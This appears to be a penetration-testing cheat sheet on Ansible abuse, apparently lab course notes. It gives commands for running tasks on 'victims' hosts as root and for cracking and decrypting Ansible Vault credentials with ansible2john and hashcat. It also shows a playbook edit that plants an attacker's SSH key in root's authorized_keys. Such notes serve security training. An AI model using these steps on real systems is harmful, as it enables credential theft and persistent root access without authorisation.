# Ansible

## General

```bash
# Ad-hoc command
ansible victims -a "whoami"
# Ad-hoc command as root
ansible victims -a "whoami" --become
```

## Playbooks

{% code overflow="wrap" %}
```bash
# A simple playbook
---
- name: Get system info
  hosts: all
  gather_facts: true
  tasks:
    - name: Display info
      debug:
          msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"
# Running the first playbook
ansible-playbook getinfo.yml
# Playbook containing credentials
---
- name: Write a file as offsec
  hosts: all
  gather_facts: true
  become: yes
  become_user: offsec
  vars:
    ansible_become_pass: lab
  tasks:
    - copy:
          content: "This is my offsec content"
          dest: "/home/offsec/written_by_ansible.txt"
          mode: 0644
          owner: offsec
          group: offsec
# Playbook with credentials encrypted with Ansible Vault
ansible_become_pass: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          39363631613935326235383232616639613231303638653761666165336131313965663033313232
          3736626166356263323964366533656633313230323964300a323838373031393362316534343863
          36623435623638373636626237333163336263623737383532663763613534313134643730643532
          3132313130313534300a383762366333303666363165383962356335383662643765313832663238
          3036
# Decrypt credentials with ansible2john.py
python3 /usr/share/john/ansible2john.py ./test.yml
# Crack credentials with hashcat
hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt
# Copy encrypted vault string to pw.txt on controller
cat pw.txt
$ANSIBLE_VAULT;1.1;AES256
39363631613935326235383232616639613231303638653761666165336131313965663033313232
3736626166356263323964366533656633313230323964300a323838373031393362316534343863
36623435623638373636626237333163336263623737383532663763613534313134643730643532
3132313130313534300a383762366333303666363165383962356335383662643765313832663238
3036
# Decrypt vault string with cracked ansible vault password. To gain credentials stored in playbook. 
cat pw.txt | ansible-vault decrypt
# If playbook is writeable we can add tasks to it. 
---
- name: Get system info
  hosts: all
  gather_facts: true
  become: yes
  tasks:
    - name: Display info
      debug:
          msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"

    - name: Create a directory if it does not exist
      file:
        path: /root/.ssh
        state: directory
        mode: '0700'
        owner: root
        group: root

    - name: Create authorized keys if it does not exist
      file:
        path: /root/.ssh/authorized_keys
        state: touch
        mode: '0600'
        owner: root
        group: root

    - name: Update keys
      lineinfile:
        path: /root/.ssh/authorized_keys
        line: "ssh-rsa AAAAB3NzaC1...Z86SOm..."
        insertbefore: EOF
# Running a shell command as a command task
    - name: Run command
      shell: touch /tmp/mycreatedfile.txt
      async: 10
      poll: 0
```
{% endcode %}
